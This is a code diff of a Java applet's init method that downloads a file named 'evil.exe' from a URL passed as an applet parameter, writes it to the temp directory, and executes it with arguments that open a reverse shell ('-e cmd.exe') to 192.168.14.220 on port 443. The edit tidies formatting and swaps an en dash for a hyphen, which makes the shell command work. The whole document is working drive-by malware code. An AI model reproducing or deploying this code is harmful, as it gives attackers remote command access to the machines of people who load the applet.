@@ -11,7 +11,8 @@ public void init() {
         Process f;
 	
 	try {
-		String tmpdir = System.getProperty("java.io.tmpdir") + File.separator; String expath = tmpdir + "evil.exe";
+		String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
+		String expath = tmpdir + "evil.exe";
 		String download = "";
 		download = getParameter("1");
 	
@@ -25,14 +26,15 @@ public void init() {
 			OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
 			byte[] buffer = new byte[2048];
 			for (;;) {
-				int nBytes = bufIn.read(buffer); if (nBytes <= 0) break;
+				int nBytes = bufIn.read(buffer);
+				if (nBytes <= 0) break;
 				out.write(buffer, 0, nBytes);
 			}
 			out.flush();
 			out.close();
 			in.close();
 			//f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
-			f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 192.168.14.220 443 –e cmd.exe");
+			f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 192.168.14.220 443 -e cmd.exe");
 		}
 		
 	}
